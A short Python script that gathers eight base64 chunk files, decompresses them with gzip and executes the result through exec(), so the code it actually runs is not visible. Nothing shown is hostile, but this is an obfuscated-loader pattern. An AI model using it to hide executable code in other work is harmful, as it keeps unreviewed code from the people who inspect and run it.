import base64,gzip
from pathlib import Path
here=Path(__file__).parent
payload=''.join((here/f'v270_{i}.b64').read_text().strip() for i in range(8))
exec(gzip.decompress(base64.b64decode(payload)).decode(), {'__file__': __file__, '__name__': '__main__'})
